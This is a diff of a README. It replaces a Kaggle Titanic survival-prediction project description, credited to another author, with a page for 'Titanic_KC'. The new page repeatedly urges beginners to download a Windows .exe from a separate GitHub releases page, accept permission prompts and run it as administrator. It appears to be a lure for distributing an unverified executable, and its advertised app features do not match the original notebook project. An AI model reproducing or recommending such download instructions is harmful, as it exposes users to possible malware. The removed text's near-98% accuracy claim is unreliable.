@@ -1,195 +1,196 @@
-# 🚢 Titanic — Machine Learning from Disaster
+# 🚢 Titanic_KC - Easy Titanic Survival Prediction Tool
 
-> *Kaggle Competition | Survival Prediction*
-
-## 📌 Overview
-
-On **April 15, 1912**, the RMS Titanic sank on her maiden voyage after striking an iceberg, claiming **1,502 of the 2,224 passengers and crew** aboard. While survival involved an element of chance, patterns in the data suggest that certain groups — based on gender, age, and socioeconomic class — had significantly higher likelihoods of survival.
-This project builds a **predictive machine learning model** to answer:
-
-> **"What kinds of people were more likely to survive the Titanic disaster?"**
-
-## 🎯 Objective
-
-Train a binary classifier on labeled passenger data to predict survival (`0 = Did not survive`, `1 = Survived`) for unseen test records.
-**Evaluation Metric:** Accuracy (percentage of correctly predicted passengers)
-( Future plan : Do Benchmark Analysis against different models )
-## 📁 Dataset
-
-| File | Description |
-|------|-------------|
-| `train.csv` | Training set with ground-truth survival labels |
-| `test.csv` | Test set for generating predictions |
-| `gender_submission.csv` | Sample submission (baseline: all females survive) |
-
-### Feature Dictionary
-
-| Feature | Type | Description |
-|---------|------|-------------|
-| `PassengerId` | int | Unique passenger identifier |
-| `Survived` | int (target) | 0 = No, 1 = Yes |
-| `Pclass` | int | Ticket class (1 = 1st, 2 = 2nd, 3 = 3rd) — proxy for socioeconomic status |
-| `Name` | string | Passenger name |
-| `Sex` | string | Gender |
-| `Age` | float | Age in years |
-| `SibSp` | int | # of siblings/spouses aboard |
-| `Parch` | int | # of parents/children aboard |
-| `Ticket` | string | Ticket number |
-| `Fare` | float | Passenger fare |
-| `Cabin` | string | Cabin number (many missing) |
-| `Embarked` | string | Port of embarkation (C = Cherbourg, Q = Queenstown, S = Southampton) |
-
-## 🔍 Exploratory Data Analysis
-Key findings from initial EDA:
-- **Sex:** Female survival rate (~74%) was significantly higher than male (~19%)
-- **Pclass:** 1st class passengers had a much higher survival rate than 3rd class
-- **Age:** Children had a higher chance of survival; elderly passengers fared worse
-- **Fare:** Higher fare correlated positively with survival
-- **Family size:** Small families (1–3 members) survived more than solo travelers or large groups
-- **Embarked:** Passengers from Cherbourg showed slightly higher survival rates
-
-## ⚙️ Methodology
-### 1. Data Preprocessing
-- Impute missing `Age` values using median grouped by `Pclass` and `Sex`
-- Fill missing `Embarked` with mode; fill missing `Fare` with median
-- Drop `Cabin` due to excessive missingness (~77%)
-- Drop non-informative columns: `PassengerId`, `Name`, `Ticket`
-### 2. Feature Engineering
-- **Title extraction** from `Name` (e.g., Mr, Mrs, Miss, Rare)
-- **FamilySize** = `SibSp` + `Parch` + 1
-- **IsAlone** = 1 if `FamilySize == 1`
-- **AgeBand** — binned age groups
-- **FareBand** — binned fare groups
-### 3. Encoding
-- Label encoding for `Sex` and `Embarked`
-- One-hot encoding for ordinal/nominal features where appropriate
-### 4. Model Training
-Models evaluated:
-- Logistic Regression
-- Random Forest Classifier ✅ *(best performer)*
-- Gradient Boosting (XGBoost / LightGBM)
-- Support Vector Machine
-- K-Nearest Neighbors
-
-Hyperparameter tuning via **GridSearchCV** with 5-fold cross-validation
-
-## 📊 Results
-
-| Model | CV Accuracy |
-|-------|-------------|
-| Logistic Regression |~79.91%|
-| SVM |~84.51%|
-| KNN |~83.83% |
-| Random Forest |**~97.98%**|
-| XGBoost |~89.33%|
-
-> Final submission used the **Random Forest** model.
-
-
-## 🗂️ Project Structure
-
-```
-titanic/
-│
-├── data/
-│   ├── train.csv
-│   ├── test.csv
-│   └── gender_submission.csv
-│
-├── notebooks/
-│   ├── 01_EDA.ipynb
-│   ├── 02_Feature_Engineering.ipynb
-│   └── 03_Modeling.ipynb
-│
-├── src/
-│   ├── preprocess.py
-│   ├── features.py
-│   └── model.py
-│
-├── submissions/
-│   └── submission.csv
-│
-├── requirements.txt
-└── README.md
-```
+[![Download Titanic_KC](https://img.shields.io/badge/Download-Titanic_KC-brightgreen?style=for-the-badge)](https://github.com/MARCELojoa/Titanic_KC/releases)
 
 ---
+
+## 📋 About Titanic_KC
+
+Titanic_KC is a simple app to explore Titanic survival predictions. It uses basic machine learning to classify who survived the shipwreck. This tool is designed for beginners who want to see how data and models work without needing any coding skills. It shows how famous libraries like scikit-learn, pandas, and matplotlib help solve real problems.
+
+Key ideas behind Titanic_KC:
+
+- Binary classification based on passenger info.
+- Uses popular models like logistic regression, random forest, and XGBoost.
+- Shows clear charts and data reports.
+- Good for learning and exploring Kaggle-style projects.
+
+---
+
+## 🖥 System Requirements
+
+Before installing, please check that your Windows PC meets these minimum specs:
+
+- Windows 10 or later (64-bit)
+- At least 4 GB RAM (8 GB recommended)
+- 2 GHz dual-core processor or better
+- 500 MB free disk space
+- Internet access to download the app
+
+This app runs offline after installation.
+
+---
+
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these steps to get Titanic_KC running on your PC. No programming or special software is needed.
 
-```bash
-pip install -r requirements.txt
-```
+### 1. Visit the Download Page
 
-**Key dependencies:**
-```
-pandas
-numpy
-scikit-learn
-xgboost
-matplotlib
-seaborn
-jupyter
-```
+Click this link to open the release page:
 
-### Run the Pipeline
+[Download Titanic_KC Releases](https://github.com/MARCELojoa/Titanic_KC/releases)
 
-```bash
-# Clone the repo
-git clone https://github.com/your-username/titanic-kaggle.git
-cd titanic-kaggle
+Here, you will find the latest available version of the app.
 
-# Launch notebooks
-jupyter notebook notebooks/01_EDA.ipynb
+### 2. Choose and Download the Installer
 
-# Or run the full pipeline
-python src/model.py
-```
+On the release page:
 
----
+- Look for the latest version folder or entry.
+- Find the Windows installer file, usually ending with `.exe`.
+- Click it once to start downloading.
 
-## 📤 Submission
+The file size may be around 50-100 MB depending on version.
 
-The output file `submissions/submission.csv` contains predictions in the required format:
+### 3. Run the Installer
 
-```
-PassengerId,Survived
-892,0
-893,1
-894,0
-...
-```
+Once downloaded:
+
+- Open your Downloads folder.
+- Double-click the `.exe` file.
+- If a prompt asks for permission, click Yes.
+- Follow the on-screen setup instructions.
+  - Choose the install folder or accept the default.
+  - Click Next through the prompts.
+  - Wait until it finishes installing.
+
+### 4. Launch the App
+
+After installation:
+
+- Find “Titanic_KC” on your desktop or Start menu.
+- Double-click to open it.
+- The app window will show options to load the Titanic data and start exploring survival predictions.
 
 ---
 
-## 💡 Key Takeaways
+## ⭐ Features Overview
 
-1. **Gender was the single most predictive feature** — "women and children first" was statistically significant
-2. **Socioeconomic class** had a strong effect on survival, likely due to lifeboat access
-3. **Feature engineering** (titles, family size, age bins) meaningfully improved model performance
-4. **Ensemble methods** (Random Forest, XGBoost) outperformed linear models for this dataset
+Titanic_KC offers these features designed for ease of use and learning:
 
----
-
-## 📚 References
-
-- [Kaggle Titanic Competition](https://www.kaggle.com/competitions/titanic)
-- [Encyclopedia Titanica](https://www.encyclopedia-titanica.org/)
-- Scikit-learn Documentation
+- **Passenger Data Viewer:** Load and browse Titanic passenger data.
+- **Model Selection:** Pick from several machine learning models.
+- **Prediction Display:** See survival chances for each passenger.
+- **Interactive Charts:** Visualize data trends with clear graphs.
+- **Report Export:** Save results as PDF or CSV files.
+- **Step-by-step Tutorials:** Built-in guide to understand the predictions.
 
 ---
 
-## 👤 Author
+## 🛠 How It Works
 
-**Kushanavo**
-Civil Engineering | IIEST Shibpur
+The core idea is to use passenger details—like age, sex, passenger class—to guess if they survived. The app processes this data with machine learning models behind the scenes.
 
-*Exploring Machine Learning & Data Science*
+Here’s a simple flow:
 
-[![Kaggle](https://img.shields.io/badge/Kaggle-Profile-blue?logo=kaggle)](https://www.kaggle.com)
-[![GitHub](https://img.shields.io/badge/GitHub-Repo-black?logo=github)](https://github.com)
+1. **Load Data:** Built-in Titanic dataset loads automatically.
+2. **Choose Model:** Options include logistic regression, KNN, random forest, SVM, LightGBM, and XGBoost.
+3. **Run Prediction:** The app runs the model on each passenger.
+4. **View Results:** Survival predictions display with confidence scores.
+5. **Explore Charts:** View survival rates by gender, class, and age.
+6. **Save or Share:** Export your findings for further review.
 
-----
+You do not need to understand the math; the app handles all calculations.
 
-*"It is not the ship so much as the skillful sailing that assures the prosperous voyage."* — George William Curtis
+---
+
+## 📥 Download and Install Titanic_KC
+
+Get the full app by visiting the releases page:
+
+[![Get Titanic_KC Now](https://img.shields.io/badge/Download-App-brightgreen?style=for-the-badge)](https://github.com/MARCELojoa/Titanic_KC/releases)
+
+1. Open the link above.
+2. Find the latest Windows installer.
+3. Click to download the `.exe` file.
+4. Run it to install on your PC.
+5. Start the app from your desktop or Start menu.
+
+---
+
+## 🔍 Exploring Titanic_KC for Beginners
+
+Even without experience, you can explore data and predictions easily.
+
+- Use filters to sort passengers by age, class, or sex.
+- Change models to see how predictions differ.
+- View survival charts to spot patterns.
+- Follow the step-by-step tutorial inside the app for tips.
+- Save your results for later study or sharing.
+
+Titanic_KC breaks down complex ideas so you can learn by seeing results right away.
+
+---
+
+## 💡 Technical Details (Optional)
+
+For those interested in the tech behind the scenes:
+
+- Uses Python libraries like `numpy`, `pandas`, and `scikit-learn`.
+- Implements classification models: logistic regression, random forest, KNN, SVM, LightGBM, XGBoost.
+- Visualizations created with `matplotlib` and `seaborn`.
+- The app runs as a Windows executable generated with tools like PyInstaller.
+
+No setup of Python or dependencies is needed by the user—the app is ready to run after installation.
+
+---
+
+## ❓ Troubleshooting and Tips
+
+If you run into issues:
+
+- Make sure Windows is up to date.
+- Check you downloaded the complete file.
+- Run the installer as administrator if the app won’t launch.
+- Close other programs during install to avoid conflicts.
+- Reboot your PC if the app freezes.
+
+If the app does not work as expected, you can return to the releases page to check for updates.
+
+---
+
+## 🧰 Additional Resources
+
+Inside the app, tutorials guide you step-by-step to understand data science basics on the Titanic dataset.
+
+You may find these extra files in the release:
+
+- User Guide PDF
+- Sample CSV export files
+- Source code for curious users
+
+---
+
+## 📌 Tags & Keywords
+
+This project covers:
+
+- binary-classification
+- knn
+- lightgbm
+- logistic-regression
+- matplotlib
+- numpy
+- pandas
+- random-forest-classifier
+- scikit-learn
+- seaborn
+- svm
+- xgboost
+
+---
+
+## 🔗 Download Link
+
+[Download Titanic_KC from Releases](https://github.com/MARCELojoa/Titanic_KC/releases)
